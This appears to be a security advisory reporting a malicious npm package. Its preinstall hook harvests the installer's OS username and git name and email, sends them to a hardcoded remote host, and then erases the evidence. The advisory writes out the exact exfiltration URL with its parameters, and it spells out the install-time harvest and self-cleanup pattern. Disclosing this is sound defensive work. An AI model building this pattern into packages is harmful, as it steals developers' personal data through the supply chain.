summary: preinstall exfiltrates installer identity (OS username, git user.name/user.email) to hardcoded remote host
details: On `npm install`, the package's preinstall lifecycle script (dist/scripts/preinstall.js, wired via package.json `"preinstall": "node./dist/scripts/preinstall.js"`) reads `os.userInfo().username` and parses the installer's `~/.gitconfig` via iniparser to extract `user.name` and `user.email`, then performs an unconditional HTTPS GET to a hardcoded host: `https://2tak.l.serverhost.name:1962/mobile/reext?osname=<username>&gitname=<git name>&gitemail=<git email>`. This silently transmits the installer's OS account name and the developer's real name + email (often a corporate address) to a third-party server on every install, with no opt-in, no documentation, and no toggle. The destination domain `2tak.l.serverhost.name` does not match the package's declared homepage (`marcgusmano.com`). A postinstall script then rewrites the installed package.json to strip `scripts`/`dependencies`/`devDependencies` and deletes `dist/scripts`, `dist/data`, `dist/resources`, `dist/source` — erasing the evidence of the phone-home from the installed tree. The combination (hardcoded non-publisher exfil endpoint + installer-PII harvest at install time + post-run self-cleanup) is a supply-chain attack pattern regardless of the author's stated intent.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
